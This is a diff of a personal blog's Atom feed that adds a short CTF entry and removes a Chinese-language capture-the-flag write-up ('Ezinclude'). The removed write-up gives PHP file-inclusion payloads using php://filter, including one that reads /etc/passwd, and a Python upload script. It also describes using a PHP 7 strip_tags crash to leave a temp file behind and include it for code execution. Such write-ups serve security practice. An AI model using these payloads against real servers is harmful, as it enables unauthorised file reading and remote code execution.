@@ -6,10 +6,41 @@
   <link href="http://lll-nnn.github.io/atom.xml" rel="self"/>
   
   <link href="http://lll-nnn.github.io/"/>
-  <updated>2021-09-07T14:38:38.520Z</updated>
+  <updated>2021-09-10T15:03:58.085Z</updated>
   <id>http://lll-nnn.github.io/</id>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>BSidesCF 2020 Hurdles</title>
+    <link href="http://lll-nnn.github.io/2021/09/10/BUU94/"/>
+    <id>http://lll-nnn.github.io/2021/09/10/BUU94/</id>
+    <published>2021-09-10T15:01:36.000Z</published>
+    <updated>2021-09-10T15:03:58.085Z</updated>
+    
+    <content type="html"><![CDATA[<p>真就假猪套天下第一呗，这么多层</p><p><a href="https://blog.csdn.net/cjdgg/article/details/119881039">https://blog.csdn.net/cjdgg/article/details/119881039</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;真就假猪套天下第一呗，这么多层&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/cjdgg/article/details/119881039&quot;&gt;https://blog.csdn.net/cjdgg/article/details/119881</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
+    
+    <category term="假猪套" scheme="http://lll-nnn.github.io/categories/CTF/%E5%81%87%E7%8C%AA%E5%A5%97/"/>
+    
+    
+    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
+    
+    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
+    
+    <category term="假猪套" scheme="http://lll-nnn.github.io/tags/%E5%81%87%E7%8C%AA%E5%A5%97/"/>
+    
+  </entry>
   
   <entry>
     <title>极客大挑战 2020 Greatphp</title>
@@ -613,38 +644,6 @@
     <category term="ERB" scheme="http://lll-nnn.github.io/tags/ERB/"/>
     
     <category term="SSTI" scheme="http://lll-nnn.github.io/tags/SSTI/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Ezinclude</title>
-    <link href="http://lll-nnn.github.io/2021/05/01/BUU81/"/>
-    <id>http://lll-nnn.github.io/2021/05/01/BUU81/</id>
-    <published>2021-05-01T15:07:45.000Z</published>
-    <updated>2021-05-01T15:55:00.334Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="【-】"><a href="#【-】" class="headerlink" title="【-+-    -+-】"></a><code>【-+-    -+-】</code></h2><p>进入环境<br><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/ec2beb98-e0a5-42f4-82d7-a399394609fe.png" alt="01.png">      </p><p>注释中有Hint      </p><p><code>&lt;!--md5($secret.$name)===$pass --&gt;</code>        </p><p>应该是要传入name和pass       </p><p>响应头里有一段hash值       </p><p>当成pass传入，name不传     </p><p><code>?pass=fa25e54758d5d5c1927781a6ede89f8a</code>      </p><p>有跳转，抓包     </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/1454b3cd-95be-480e-a3e5-4f6e0ce65151.png" alt="02.png">       </p><p>看一下<code>flflflflag.php</code>     </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/2e856e0a-e4e7-42c6-a5cd-3de410a8da3f.png" alt="03.png"></p><p>有include，伪协议读一下源码      </p><p><code>?file=php://filter/read=convert.base64.encode/resource=flflflflag.php</code>       </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/636b976a-82d7-40c9-b96b-5cb660f19217.png" alt="04.png">     </p><p>解码后       </p><pre><code><pre><code class="hljs php">&lt;html&gt;&lt;head&gt;&lt;script language=<span class="hljs-string">&quot;javascript&quot;</span> type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;           window.location.href=<span class="hljs-string">&quot;404.html&quot;</span>;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;<span class="hljs-meta">&lt;?php</span>$file=$_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/data|input|zip/is&#x27;</span>,$file))&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);&#125;@<span class="hljs-keyword">include</span>($file);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;<span class="hljs-meta">?&gt;</span>&lt;/body&gt;&lt;/html&gt;</code></pre></code></pre><p>感觉也没啥啊       </p><p>接下来利用<code>php://filter/string.strip_tags</code>       </p><p>php7.0的BUG</p><p>payload:<code>?file=php://filter/string.strip_tags/resource=/etc/passwd</code>       </p><p>输入payload后，会导致PHP崩溃清空堆栈重启，如果同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell         </p><p><a href="https://www.cnblogs.com/tr1ple/p/11301743.html">关于php文件操作的几个小trick </a></p><p>上传脚本     </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIOurl=<span class="hljs-string">&#x27;http://e17fbb9d-53e9-44fc-9c60-91d0f4e7e017.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span>file=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:BytesIO(<span class="hljs-string">b&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>)&#125;r=requests.post(url=url,files=file,allow_redirects=<span class="hljs-literal">False</span>)print(<span class="hljs-string">&quot;YEs&quot;</span>)</code></pre></code></pre><p>应该写一句话木马的，但我试了好几次都没成功，<code>phpinfo();</code>都没法执行       </p><p>然后会在<code>dir.php</code>（包含/tmp中的文件）中得到文件名       </p><p><code>array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [4]=&gt; string(9) &quot;phpTwf0sR&quot;</code>      </p><p>包含即可      </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/4f1e5174-3581-4ee9-bbc9-9e1cd96ee7f2.png" alt="05.png"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;【-】&quot;&gt;&lt;a href=&quot;#【-】&quot; class=&quot;headerlink&quot; title=&quot;【-+-    -+-】&quot;&gt;&lt;/a&gt;&lt;code&gt;【-+-    -+-】&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;进入环境&lt;br&gt;&lt;img src=&quot;https://zebra-com</summary>
-      
-    
-    
-    
-    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
-    
-    <category term="PHP" scheme="http://lll-nnn.github.io/categories/CTF/PHP/"/>
-    
-    
-    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
-    
-    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
-    
-    <category term="文件读取" scheme="http://lll-nnn.github.io/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
-    
-    <category term="php://filter/string.strip_tags" scheme="http://lll-nnn.github.io/tags/php-filter-string-strip-tags/"/>
     
   </entry>
   
